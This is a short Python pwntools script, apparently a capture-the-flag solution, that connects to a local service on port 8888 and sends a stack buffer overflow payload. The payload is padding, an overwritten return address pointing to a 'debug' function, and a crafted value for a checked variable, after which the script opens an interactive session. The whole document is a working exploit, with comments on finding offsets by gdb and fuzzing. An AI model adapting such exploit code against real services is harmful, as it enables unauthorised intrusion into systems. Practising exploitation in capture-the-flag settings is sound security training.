from pwn import *

def exploit():
	r = remote("127.0.0.1", 8888)
	r.sendline("Nayeon") 
	payload = "A" * 128 # Gotten by doing Static analyzing on gdb and fuzzing so hard
	payload += "\x71\x92\x04\x08" #address of debug
	payload += "A" * 48 #Gotten by Fuzzing until we got the right padding for overwriting v7
	payload += "\x24\x23\x40" #condition of v7
	r.sendline(payload)
	r.interactive()

if __name__ == "__main__":
	exploit()
